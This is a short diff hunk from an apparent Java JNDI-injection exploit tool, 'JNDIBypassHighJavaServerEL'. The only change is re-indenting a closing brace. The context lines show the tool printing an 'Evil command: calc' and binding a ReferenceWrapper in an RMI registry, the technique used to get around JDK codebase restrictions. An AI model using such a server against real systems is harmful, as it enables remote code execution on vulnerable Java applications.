@@ -25,5 +25,5 @@ public class JNDIBypassHighJavaServerEL {
         System.out.println("[*]Evil command: calc");
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
         registry.bind("Object", referenceWrapper);
-    }
+}
 }
